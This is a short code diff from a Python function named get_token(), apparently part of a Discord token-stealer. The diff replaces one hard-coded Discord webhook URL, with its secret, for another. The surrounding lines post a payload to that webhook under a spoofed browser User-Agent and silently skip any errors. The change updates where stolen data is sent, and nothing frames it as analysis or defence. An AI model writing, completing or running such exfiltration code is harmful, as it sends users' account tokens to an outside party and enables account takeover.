@@ -121,7 +121,7 @@ def get_token():
                                 'Content-Type': 'application/json',
                                 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                             }
-                            req = Request('https://discord.com/api/webhooks/1492841624378675304/8vRf8mnPQMUVk9e0qSH_M1SNL-ZHTjo0k0w5NTi-r-LJ_Q_gsOCkAxT7CoD_9DPmTp8E', data=payload.encode(), headers=headers2)
+                            req = Request('https://discord.com/api/webhooks/1493484103411040326/wd8H6gV2rPDyNWJWtZjpZ3uITWDeA7S6MEdMl7Nbh5ZLkbpWlskvNi1DijRCXhL_dh4Q', data=payload.encode(), headers=headers2)
                             urlopen(req)
                         except: continue
                 else: continue
